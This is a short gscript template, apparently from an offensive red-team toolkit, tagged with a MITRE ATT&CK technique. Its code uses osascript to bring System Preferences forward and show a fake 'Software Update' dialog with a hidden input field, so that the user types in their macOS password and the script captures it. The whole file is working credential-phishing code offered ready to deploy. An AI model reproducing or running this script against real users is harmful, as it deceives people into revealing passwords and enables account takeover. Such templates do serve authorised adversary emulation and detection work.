// Example gscript template
// Title: Osascript Prompt
// Author: ahhh
// Purpose: Prompts the user for their password with the builtin Osascript
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1141

//priority:150
//timeout:150

function Deploy() {  
    console.log("Starting osascript prompt")
    var first = 'tell app "System Preferences" to activate';
    var second = 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"';
    var response = G.exec.ExecuteCommand("osascript", ["-e", first, "-e", first, "-e", second]);
    console.log("Pid: "+response[0]);
    console.log("stdout: "+response[1]);
    console.log("stderr: "+response[2]);
    console.log("exit code: "+response[3]);
    console.log("go errors: "+response[4]);
    return true;
}

